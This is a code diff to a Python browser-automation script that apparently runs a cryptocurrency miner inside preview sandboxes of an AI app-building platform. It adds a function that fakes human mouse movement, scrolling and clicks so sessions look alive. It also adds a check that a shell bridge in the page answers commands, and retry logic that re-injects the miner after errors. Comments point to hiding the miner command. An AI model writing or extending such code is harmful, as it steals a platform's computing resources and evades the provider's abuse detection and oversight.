@@ -19,6 +19,52 @@ def generate_random_folder_name() -> str:
     return "moly"
 
 
+async def human_presence(page, moves: int = 3) -> None:
+    """Human touch: random mouse moves, scroll, neutral click. Keeps both
+    chat and preview tabs looking alive between checks."""
+    try:
+        for _ in range(moves):
+            try:
+                await page.mouse.move(random.randint(100, 1700),
+                                      random.randint(100, 850))
+            except Exception:
+                pass
+            await asyncio.sleep(random.uniform(0.2, 0.7))
+        try:
+            await page.mouse.wheel(0, random.randint(-200, 200))
+        except Exception:
+            pass
+        await asyncio.sleep(random.uniform(0.2, 0.6))
+        # neutral click on empty page area (never links/buttons)
+        try:
+            box = await page.evaluate("""() => ({w: window.innerWidth, h: window.innerHeight})""")
+            await page.mouse.click(int(box["w"] * 0.5), int(box["h"] * 0.92))
+        except Exception:
+            pass
+    except Exception:
+        pass
+
+
+async def wait_console_ready(page, timeout_seconds: int = 300) -> bool:
+    """Wait until window.doc bridge answers (console-ready gate)."""
+    start = asyncio.get_running_loop().time()
+    while asyncio.get_running_loop().time() - start < timeout_seconds:
+        try:
+            ok = await page.evaluate("""() => {
+                if (!window.doc || typeof window.doc !== 'function') return false;
+                try {
+                    const p = window.doc('pwd');
+                    return !!(p && typeof p.then === 'function');
+                } catch (e) { return false; }
+            }""")
+            if ok:
+                return True
+        except Exception:
+            pass
+        await asyncio.sleep(10)
+    return False
+
+
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
     """Build worker start command (MINER_CMD env overrides, never commit it)."""
     import os as _os
@@ -321,19 +367,42 @@ async def recover_from_error(page, project_url: str, bridge_url: str = BRIDGE_UR
         print(f"⏳ Waiting {wait_time} seconds for AI to respond...")
         await asyncio.sleep(wait_time)
         
-        # 4. Go back to preview
+        # 4. Go back to preview, refresh until 404 gone (max 6 tries)
         print(f"🔄 Returning to preview: {preview_url}")
         await page.goto(preview_url, timeout=30000)
-        await asyncio.sleep(5)
-        
-        # 5. Check health
-        health = await check_preview_health(page)
-        if health != "OK":
-            print(f"⚠️  Preview still not OK: {health}")
+        await human_presence(page, moves=2)
+        cleared = False
+        for attempt in range(6):
+            await asyncio.sleep(8)
+            try:
+                content = await page.content()
+            except Exception:
+                content = ""
+            if "Lovable proxy error" in content and "404" in content:
+                print(f"   🔄 404 still present, refreshing ({attempt+1}/6)...")
+                try:
+                    await page.reload(timeout=30000)
+                except Exception:
+                    pass
+                await human_presence(page, moves=2)
+                continue
+            cleared = True
+            break
+        if not cleared:
+            print("   ⚠️  404 stuck after 6 refreshes")
             return False
-        
+        print("   ✅ 404 gone")
+
+        # 5. Console-ready gate, then re-inject (same order as fresh visit)
+        print("   ⏳ Waiting console-ready gate...")
+        if not await wait_console_ready(page, timeout_seconds=300):
+            print("   ⚠️  Console never ready after recovery")
+            return False
+        print("   ✅ Console ready")
+
         # 6. Restart worker
         print("⚙️ Restarting worker...")
+        await human_presence(page, moves=2)
         success = await inject_miner(page, bridge_url)
         
         if success:
@@ -460,8 +529,10 @@ async def health_check_loop(page, project_url: str, mode: str = "full", bridge_u
             
             elif health == "OK":
                 print("   ✅ Preview healthy")
+                await human_presence(page, moves=3)
             else:
                 print("   ⚠️  Unknown status")
+                await human_presence(page, moves=2)
             
             # Wait for next check
             print(f"   ⏳ Next check in {check_interval}s...")
